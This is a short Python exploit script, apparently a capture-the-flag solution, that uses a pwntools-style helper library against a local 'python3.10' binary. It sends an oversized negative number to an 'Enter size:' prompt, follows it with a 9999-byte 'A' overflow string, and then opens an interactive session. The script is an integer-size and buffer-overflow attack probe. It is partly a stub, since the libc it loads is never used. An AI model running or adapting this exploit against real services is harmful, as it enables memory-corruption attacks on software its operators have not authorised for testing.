#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit.basic import *
from time import sleep

exe = context.binary = ELF("./python3.10")
host = args.HOST or "0.0.0.0"
port = int(args.PORT or 1337)

gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

libc = SetupLibcELF()
io = start()

sla(b"Enter size: ", b"-99999999999999999")
re()
pause()
sl(b"A" * 9999)

io.interactive()
